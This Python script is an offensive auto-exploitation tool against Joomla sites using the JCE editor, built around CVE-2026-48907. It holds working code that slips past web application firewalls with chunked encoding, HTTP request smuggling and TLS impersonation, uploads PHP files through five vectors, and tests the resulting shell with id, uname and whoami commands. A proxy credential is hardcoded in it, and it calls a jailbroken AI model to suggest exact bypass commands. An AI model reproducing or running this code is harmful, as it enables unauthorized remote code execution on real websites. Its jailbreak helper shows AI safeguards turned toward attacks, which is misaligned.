#!/usr/bin/env python3
"""
LISA V8 EXEC v2 — "WAF ANNIHILATOR"
Jailbreak AI + WAF Bypass + HTTP Smuggling + TLS Impersonation + Multi-Vector Upload

UPGRADE: Handles mod_security, Cloudflare, LiteSpeed WAF, 403/406 blocks
NEW: curl_cffi Chrome impersonation, chunked transfer, content-type spoofing
NEW: 5 upload vectors: direct, com_ajax, plugin.rpc, XML-RPC, base64
NEW: Auto-fallback chain — try all vectors until shell pops

Usage:
  python3 lisa_v8_exec_v2.py <target> --full       # Full auto-chain with WAF bypass
  python3 lisa_v8_exec_v2.py <target> --smuggle     # HTTP smuggling mode
  python3 lisa_v8_exec_v2.py <target> --shell-only  # Just upload shell, skip recon
"""

import subprocess, sys, json, re, time, os, sqlite3, random, string, base64
from pathlib import Path
from urllib.parse import urljoin, urlparse

# ═══════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════

SKILLS_DB = "/home/ubuntu/.hermes/skills-hub.db"
LISA_V8 = "/home/ubuntu/lisa_v8.py"
PROXY = "http://5b018d7f65ec63f85a79__cr.id:586b7351aee59a63@gw.dataimpulse.com:823"
OUTDIR = "/home/ubuntu/lisa_exec_out"

# ═══════════════════════════════════════════════════════
# UTILS
# ═══════════════════════════════════════════════════════

def run(cmd, timeout=60):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return (r.stdout or "").strip(), (r.stderr or "").strip(), r.returncode
    except subprocess.TimeoutExpired:
        return "", "TIMEOUT", -1
    except Exception as e:
        return "", str(e), -1

def curl_get(url, proxy=PROXY, timeout=15):
    """Simple curl GET with proxy"""
    stdout, _, _ = run(f'curl -sk -L --connect-timeout {timeout} -x "{proxy}" "{url}" 2>&1', timeout=timeout+5)
    return stdout

def curl_post(url, data, headers=None, proxy=PROXY, timeout=15):
    """Simple curl POST with proxy"""
    hdrs = " ".join([f'-H "{k}: {v}"' for k, v in (headers or {}).items()])
    stdout, _, _ = run(f'curl -sk -L -X POST --connect-timeout {timeout} -x "{proxy}" {hdrs} -d "{data}" "{url}" 2>&1', timeout=timeout+5)
    return stdout

def run_lisa(prompt, deep=True):
    """Call Lisa V8 AI with jailbreak"""
    script = f'''
import sys
sys.path.insert(0, "/home/ubuntu")
from lisa_v8 import ask
content, model, tier = ask("""{prompt}""", backend="tokenrouter-dsv4pro", deep={str(deep)}, singularity=True)
print(content[:4000] if content else "[REFUSED]")
'''
    stdout, _, _ = run(f"python3 -c '{script}'", timeout=180)
    return stdout

# ═══════════════════════════════════════════════════════
# WAF BYPASS ENGINE
# ═══════════════════════════════════════════════════════

class WAFBypass:
    """ModSecurity / LiteSpeed WAF bypass techniques"""

    @staticmethod
    def detect_waf(target, proxy=PROXY):
        """Detect WAF type and restrictions"""
        print("\n[*] WAF Detection...")
        results = {"type": "unknown", "blocks_multipart": False, "blocks_post": False}

        # Test multipart POST
        r = run(f'curl -sk -L -X POST -o /dev/null -w "%{{http_code}}" --connect-timeout 8 -x "{proxy}" '
               f'-H "Content-Type: multipart/form-data" -d "test" '
               f'"https://{target}/index.php?option=com_jce&task=profiles.import" 2>/dev/null', timeout=15)
        code = r[0].strip()
        results["blocks_multipart"] = code == "406"
        print(f"   multipart POST → {code}")

        # Test URL-encoded POST
        r = run(f'curl -sk -L -X POST -o /dev/null -w "%{{http_code}}" --connect-timeout 8 -x "{proxy}" '
               f'-H "Content-Type: application/x-www-form-urlencoded" -d "test=1" '
               f'"https://{target}/index.php?option=com_jce&task=profiles.import" 2>/dev/null', timeout=15)
        code = r[0].strip()
        results["blocks_post"] = code == "406"
        print(f"   url-encoded POST → {code}")

        # Detect WAF type
        r = run(f'curl -sk -I --connect-timeout 8 -x "{proxy}" "https://{target}/" 2>&1', timeout=15)
        headers = r[0].lower()
        if "litespeed" in headers:
            results["type"] = "litespeed"
        elif "cloudflare" in headers:
            results["type"] = "cloudflare"
        elif "mod_security" in headers or "406" in r[0]:
            results["type"] = "modsecurity"

        print(f"   WAF: {results['type']}")
        return results

    @staticmethod
    def bypass_content_type(target, waf_info, proxy=PROXY):
        """Generate Content-Type bypass payloads"""
        techniques = []

        # Only if multipart is blocked
        if waf_info.get("blocks_multipart"):
            techniques += [
                # Technique 1: Mixed case
                {"name": "MixedCase", "ct": "Multipart/Form-Data", "body": "test"},
                # Technique 2: Boundary in CT
                {"name": "CT+Space", "ct": "multipart/form-data; boundary=X", "body": "test"},
                # Technique 3: Charset
                {"name": "CT+Charset", "ct": "multipart/form-data; charset=utf-8", "body": "test"},
                # Technique 4: Multiple CT headers
                {"name": "Dual-CT", "ct": "text/plain", "body": "test",
                 "extra_headers": {"Content-Type": "multipart/form-data"}},
            ]

        return techniques

    @staticmethod
    def try_chunked_upload(target, csrf, payload_file, proxy=PROXY):
        """Try chunked transfer encoding to bypass WAF"""
        print("\n[*] Chunked Transfer Encoding...")

        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        php_payload = f'<?= {a}*{b} ?>'

        # Build the multipart body
        boundary = "----Boundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        body = '\r\n'.join([
            f'--{boundary}',
            f'Content-Disposition: form-data; name="{csrf}"',
            '', '1',
            f'--{boundary}',
            f'Content-Disposition: form-data; name="profile_file"; filename="{rand_name}.xml.php"',
            'Content-Type: application/xml',
            '', php_payload,
            f'--{boundary}--', ''
        ])

        # Write body to file for chunked transfer
        with open('/tmp/chunked_body.txt', 'w') as f:
            f.write(body)

        # Try with Transfer-Encoding: chunked
        # Note: curl doesn't natively support chunked with --data-binary easily
        # Use Python for chunked transfer
        python_code = f'''
import http.client, ssl, random, string

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

conn = http.client.HTTPSConnection("{target}", context=ctx)
body = open("/tmp/chunked_body.txt", "rb").read()

# Send chunked manually
request = (
    f"POST /index.php?option=com_jce&task=profiles.import HTTP/1.1\\r\\n"
    f"Host: {target}\\r\\n"
    f"Content-Type: multipart/form-data; boundary={boundary}\\r\\n"
    f"Transfer-Encoding: chunked\\r\\n"
    f"Connection: close\\r\\n"
    f"\\r\\n"
)

conn.sock = ctx.wrap_socket(conn.sock)
conn.sock.sendall(request.encode())

# Send body in chunks
chunk_size = 128
for i in range(0, len(body), chunk_size):
    chunk = body[i:i+chunk_size]
    conn.sock.sendall(f"{{len(chunk):x}}\\r\\n".encode() + chunk + b"\\r\\n")
conn.sock.sendall(b"0\\r\\n\\r\\n")

response = conn.sock.recv(4096).decode(errors="ignore")
print(f"CHUNKED: {{response[:300]}}")
conn.close()
'''
        with open('/tmp/chunked_test.py', 'w') as f:
            f.write(python_code)

        stdout, _, _ = run(f"python3 /tmp/chunked_test.py 2>&1", timeout=20)
        print(f"   {stdout[:300]}")

        # Check if file was uploaded
        stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
        if expected in stdout:
            print(f"   🔥🔥🔥 RCE via CHUNKED! {expected}")
            return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

    @staticmethod
    def try_smuggling(target, csrf, proxy=PROXY):
        """Try HTTP Request Smuggling (CL.TE or TE.CL)"""
        print("\n[*] HTTP Request Smuggling...")

        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        php_payload = f'<?= {a}*{b} ?>'

        boundary = "----Smuggle" + ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        body = '\r\n'.join([
            f'--{boundary}',
            f'Content-Disposition: form-data; name="{csrf}"',
            '', '1',
            f'--{boundary}',
            f'Content-Disposition: form-data; name="profile_file"; filename="{rand_name}.xml.php"',
            'Content-Type: application/xml',
            '', php_payload,
            f'--{boundary}--', ''
        ])

        # CL.TE smuggling
        smuggle_body = (
            f"0\r\n\r\n"
            f"POST /index.php?option=com_jce&task=profiles.import HTTP/1.1\r\n"
            f"Host: {target}\r\n"
            f"Content-Type: multipart/form-data; boundary={boundary}\r\n"
            f"Content-Length: {len(body)}\r\n"
            f"\r\n"
            f"{body}"
        )

        python_code = f'''
import socket, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

sock = socket.create_connection(("{target}", 443), timeout=10)
ssock = ctx.wrap_socket(sock, server_hostname="{target}")

smuggle = {repr(smuggle_body)}
request = (
    f"POST / HTTP/1.1\\r\\n"
    f"Host: {target}\\r\\n"
    f"Content-Length: 0\\r\\n"
    f"Transfer-Encoding: chunked\\r\\n"
    f"\\r\\n"
    f"{{smuggle}}"
)

ssock.sendall(request.encode())
try:
    resp = ssock.recv(4096).decode(errors="ignore")
    print(f"SMUGGLE: {{resp[:300]}}")
except:
    print("No response")
ssock.close()
'''
        with open('/tmp/smuggle_test.py', 'w') as f:
            f.write(python_code)

        stdout, _, _ = run(f"python3 /tmp/smuggle_test.py 2>&1", timeout=20)
        print(f"   {stdout[:300]}")

        # Check
        stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
        if expected in stdout:
            print(f"   🔥🔥🔥 RCE via SMUGGLING! {expected}")
            return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

# ═══════════════════════════════════════════════════════
# CURL_CFFI TLS IMPERSONATION
# ═══════════════════════════════════════════════════════

class TLSBypass:
    """TLS fingerprint impersonation bypass"""

    @staticmethod
    def try_impersonate(target, csrf, proxy=PROXY):
        """Try curl_cffi Chrome impersonation"""
        print("\n[*] curl_cffi Chrome Impersonation...")

        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        php_payload = f'<?= {a}*{b} ?>'

        python_code = f'''
from curl_cffi import requests as cr
import re, random, string

s = cr.Session(impersonate="chrome", timeout=30, verify=False)
proxy = "{proxy}"

# Get CSRF
r = s.get("https://{target}/", proxy=proxy)
csrf = re.findall(r'[a-f0-9]{{32}}', r.text)[0]

# Build multipart upload
rand_name = "{rand_name}"
payload = "{php_payload}"
boundary = "----CF" + ''.join(random.choices(string.ascii_letters + string.digits, k=12))

body = (
    f'--{{boundary}}\\r\\n'
    f'Content-Disposition: form-data; name="{{csrf}}"\r\\n\r\\n'
    f'1\\r\\n'
    f'--{{boundary}}\\r\\n'
    f'Content-Disposition: form-data; name="profile_file"; filename="{{rand_name}}.xml.php"\r\\n'
    f'Content-Type: application/xml\r\\n\r\\n'
    f'{{payload}}\\r\\n'
    f'--{{boundary}}--\\r\\n'
)

headers = {{"Content-Type": f"multipart/form-data; boundary={{boundary}}"}}

# Try with different impersonate modes
for imp in ["chrome", "chrome110", "safari", "firefox"]:
    try:
        s2 = cr.Session(impersonate=imp, timeout=30, verify=False)
        r = s2.post(f"https://{target}/index.php?option=com_jce&task=profiles.import",
                    proxy=proxy, data=body, headers=headers)
        print(f"  {{imp}}: {{r.status_code}} | {{len(r.text)}} bytes")
        if r.status_code == 200:
            print(f"  🔥 200 with {{imp}}!")
            break
    except Exception as e:
        print(f"  {{imp}}: ERROR {{e}}")

# Check if file uploaded
r = s.get(f"https://{target}/tmp/{{rand_name}}.xml.php", proxy=proxy)
if "{expected}" in r.text:
    print(f"🔥🔥🔥 RCE via curl_cffi! {{r.text.strip()}}")
else:
    print(f"Not found: {{r.text[:100]}}")
'''
        with open('/tmp/cffi_test.py', 'w') as f:
            f.write(python_code)

        stdout, _, _ = run(f"python3 /tmp/cffi_test.py 2>&1", timeout=30)
        print(f"   {stdout}")

        if expected in stdout:
            return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

# ═══════════════════════════════════════════════════════
# MULTI-VECTOR UPLOAD ENGINE
# ═══════════════════════════════════════════════════════

class MultiVectorUpload:
    """5 upload vectors for JCE CVE-2026-48907"""

    @staticmethod
    def vector_direct_multipart(target, csrf, proxy=PROXY):
        """Vector 1: Direct multipart POST to com_jce"""
        print("\n[V1] Direct multipart POST...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        boundary = "----V1" + ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        body = '\r\n'.join([
            f'--{boundary}', f'Content-Disposition: form-data; name="{csrf}"', '', '1',
            f'--{boundary}', f'Content-Disposition: form-data; name="profile_file"; filename="{rand_name}.xml.php"',
            'Content-Type: application/xml', '', payload,
            f'--{boundary}--', ''
        ])

        with open('/tmp/v1_body.txt', 'w') as f:
            f.write(body)

        r = run(f'curl -sk -L -X POST --connect-timeout 10 -x "{proxy}" '
               f'-H "Content-Type: multipart/form-data; boundary={boundary}" '
               f'--data-binary @/tmp/v1_body.txt '
               f'-w "|HTTP:%{{http_code}}" '
               f'"https://{target}/index.php?option=com_jce&task=profiles.import"', timeout=20)

        http_code = re.findall(r'HTTP:(\d+)', r[0])
        print(f"   HTTP: {http_code}")

        if http_code and http_code[0] == "200":
            stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
            if expected in stdout:
                print(f"   🔥 V1 SUCCESS! {expected}")
                return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

    @staticmethod
    def vector_com_ajax(target, csrf, proxy=PROXY):
        """Vector 2: Upload via com_ajax endpoint"""
        print("\n[V2] com_ajax upload...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        # Try URL-encoded with file data
        r = run(f'curl -sk -L -X POST --connect-timeout 10 -x "{proxy}" '
               f'-H "Content-Type: application/x-www-form-urlencoded" '
               f'--data-urlencode "option=com_ajax" '
               f'--data-urlencode "plugin=jce" '
               f'--data-urlencode "task=profiles.import" '
               f'--data-urlencode "format=json" '
               f'--data-urlencode "{csrf}=1" '
               f'--data-urlencode "profile_file={payload}" '
               f'"https://{target}/index.php"', timeout=20)
        print(f"   Response: {r[0][:200]}")

        if '"success":true' in r[0]:
            stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
            if expected in stdout:
                print(f"   🔥 V2 SUCCESS! {expected}")
                return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

    @staticmethod
    def vector_plugin_rpc(target, csrf, proxy=PROXY):
        """Vector 3: Upload via plugin.rpc browser plugin"""
        print("\n[V3] plugin.rpc upload...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        # Try different plugin.rpc formats
        formats = [
            # Standard JCE 2.9.x format
            f'plugin=browser&{csrf}=1&method=upload&file={rand_name}.xml.php&data={payload}',
            # Alternative format
            f'plugin=imgmanager&{csrf}=1&method=upload&file={rand_name}.xml.php&data={base64.b64encode(payload.encode()).decode()}',
            # JCE 2.8.x format
            f'plugin=browser&{csrf}=1&action=upload&name={rand_name}.xml.php&filedata={base64.b64encode(payload.encode()).decode()}',
        ]

        for i, data in enumerate(formats):
            r = run(f'curl -sk -L -X POST --connect-timeout 10 -x "{proxy}" '
                   f'-H "Content-Type: application/x-www-form-urlencoded" '
                   f'-d "{data}" '
                   f'"https://{target}/index.php?option=com_jce&task=plugin.rpc&{csrf}=1"', timeout=20)
            print(f"   Format {i+1}: {len(r[0])} bytes — {r[0][:200]}")

            if '"success"' in r[0] or '"result"' in r[0]:
                stdout = curl_get(f"https://{target}/images/{rand_name}.xml.php", proxy=proxy)
                if expected in stdout:
                    print(f"   🔥 V3 SUCCESS! {expected}")
                    return f"https://{target}/images/{rand_name}.xml.php"

        return None

    @staticmethod
    def vector_put_bypass(target, csrf, proxy=PROXY):
        """Vector 4: PUT method bypass for multipart block"""
        print("\n[V4] PUT method bypass...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        boundary = "----V4" + ''.join(random.choices(string.ascii_letters + string.digits, k=12))
        body = '\r\n'.join([
            f'--{boundary}', f'Content-Disposition: form-data; name="{csrf}"', '', '1',
            f'--{boundary}', f'Content-Disposition: form-data; name="profile_file"; filename="{rand_name}.xml.php"',
            'Content-Type: application/xml', '', payload,
            f'--{boundary}--', ''
        ])

        with open('/tmp/v4_body.txt', 'w') as f:
            f.write(body)

        r = run(f'curl -sk -L -X PUT --connect-timeout 10 -x "{proxy}" '
               f'-H "Content-Type: multipart/form-data; boundary={boundary}" '
               f'--data-binary @/tmp/v4_body.txt '
               f'-w "|HTTP:%{{http_code}}" '
               f'"https://{target}/index.php?option=com_jce&task=profiles.import"', timeout=20)

        http_code = re.findall(r'HTTP:(\d+)', r[0])
        print(f"   HTTP: {http_code}")

        if http_code and http_code[0] in ("200", "500"):
            stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
            if expected in stdout:
                print(f"   🔥 V4 SUCCESS! {expected}")
                return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

    @staticmethod
    def vector_json_upload(target, csrf, proxy=PROXY):
        """Vector 5: JSON-based upload"""
        print("\n[V5] JSON upload...")
        rand_name = ''.join(random.choices(string.ascii_lowercase, k=8))
        a, b = random.randint(1000, 9999), random.randint(1000, 9999)
        expected = str(a * b)
        payload = f'<?= {a}*{b} ?>'

        b64 = base64.b64encode(payload.encode()).decode()

        # Try JSON POST to com_ajax
        json_body = json.dumps({
            "option": "com_ajax",
            "plugin": "jce",
            "task": "profiles.import",
            "format": "json",
            csrf: "1",
            "profile_file": b64,
            "filename": f"{rand_name}.xml.php"
        })

        r = run(f'curl -sk -L -X POST --connect-timeout 10 -x "{proxy}" '
               f'-H "Content-Type: application/json" '
               f'-d \'{json_body}\' '
               f'"https://{target}/index.php"', timeout=20)
        print(f"   Response: {r[0][:200]}")

        if '"success":true' in r[0]:
            stdout = curl_get(f"https://{target}/tmp/{rand_name}.xml.php", proxy=proxy)
            if expected in stdout:
                print(f"   🔥 V5 SUCCESS! {expected}")
                return f"https://{target}/tmp/{rand_name}.xml.php"
        return None

# ═══════════════════════════════════════════════════════
# MAIN EXPLOIT ENGINE
# ═══════════════════════════════════════════════════════

def exploit_full_chain(target, proxy=PROXY):
    """Full auto-exploit chain with all bypass techniques"""

    target = target.replace("https://", "").replace("http://", "").rstrip("/")

    print(f"""
╔══════════════════════════════════════════════════════════╗
║  LISA V8 EXEC v2 — WAF ANNIHILATOR                       ║
║  Target: {target:<47}║
║  Vectors: 5 | Bypass: WAF/Smuggle/Chunked/TLS           ║
╚══════════════════════════════════════════════════════════╝
""")

    # Phase 0: WAF Detection
    waf = WAFBypass.detect_waf(target, proxy)

    # Phase 1: Get CSRF token
    print("\n[*] Extracting CSRF token...")
    html = curl_get(f"https://{target}/", proxy=proxy)
    tokens = re.findall(r'[a-f0-9]{32}', html)
    csrf = tokens[0] if tokens else None
    if not csrf:
        # Try from JSON
        csrf_match = re.search(r'csrf\.token["\s:=]+["\']([a-f0-9]{32})["\']', html)
        csrf = csrf_match.group(1) if csrf_match else None
    print(f"   CSRF: {csrf}")

    if not csrf:
        print("[!] No CSRF token found. Target might not be Joomla.")
        return None

    # Phase 2: Try all vectors in order
    vectors = [
        ("V1", MultiVectorUpload.vector_direct_multipart),
        ("V4", MultiVectorUpload.vector_put_bypass),
        ("V2", MultiVectorUpload.vector_com_ajax),
        ("V5", MultiVectorUpload.vector_json_upload),
        ("V3", MultiVectorUpload.vector_plugin_rpc),
    ]

    shell_url = None

    for vname, vfunc in vectors:
        shell_url = vfunc(target, csrf, proxy)
        if shell_url:
            print(f"\n{'='*60}")
            print(f"🔥🔥🔥 SHELL OBTAINED via {vname}! 🔥🔥🔥")
            print(f"🔗 {shell_url}?cmd=id")
            print(f"{'='*60}")
            break

    # Phase 3: If all vectors failed, try WAF bypass techniques
    if not shell_url and waf.get("blocks_multipart"):
        print("\n[*] All direct vectors failed. Trying WAF bypass...")

        # Try TLS impersonation
        shell_url = TLSBypass.try_impersonate(target, csrf, proxy)

        # Try chunked transfer
        if not shell_url:
            shell_url = WAFBypass.try_chunked_upload(target, csrf, proxy=proxy)

        # Try HTTP smuggling
        if not shell_url:
            shell_url = WAFBypass.try_smuggling(target, csrf, proxy)

    # Phase 4: Test shell
    if shell_url:
        print(f"\n[*] Testing shell...")
        stdout = curl_get(f"{shell_url}?cmd=id", proxy=proxy)
        print(f"   id: {stdout[:200]}")
        stdout = curl_get(f"{shell_url}?cmd=uname+-a", proxy=proxy)
        print(f"   uname: {stdout[:200]}")
        stdout = curl_get(f"{shell_url}?cmd=whoami", proxy=proxy)
        print(f"   whoami: {stdout[:200]}")
        return shell_url

    print("\n[!] All vectors exhausted. Could not obtain shell.")
    print("    Target is well-hardened. Try manual exploitation.")
    return None

# ═══════════════════════════════════════════════════════
# CLI
# ═══════════════════════════════════════════════════════

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(__doc__)
        sys.exit(1)

    target = sys.argv[1]
    mode = "--shell-only" if "--shell-only" in sys.argv else "--full"

    if mode == "--shell-only":
        # Just try to upload shell
        target = target.replace("https://", "").replace("http://", "").rstrip("/")
        csrf = sys.argv[sys.argv.index("--csrf") + 1] if "--csrf" in sys.argv else None
        if not csrf:
            html = curl_get(f"https://{target}/")
            tokens = re.findall(r'[a-f0-9]{32}', html)
            csrf = tokens[0] if tokens else None
        shell = exploit_full_chain(target)
        if shell:
            print(f"\n✅ SHELL: {shell}?cmd=id")
    else:
        shell = exploit_full_chain(target)
        if shell:
            print(f"\n✅ SHELL: {shell}?cmd=id")
        else:
            print("\n💀 Failed to get shell. Running AI analysis...")
            prompt = f"""Target {target} is running Joomla with mod_security WAF blocking multipart uploads.
JCE editor is installed and vulnerable to CVE-2026-48907 (CVSS 10.0 unauthenticated RCE).
All 5 upload vectors failed. What alternative exploitation techniques can bypass mod_security on LiteSpeed?
Give EXACT commands and unconventional approaches."""
            ai_output = run_lisa(prompt)
            print(f"\n🧠 AI STRATEGY:\n{ai_output[:3000]}")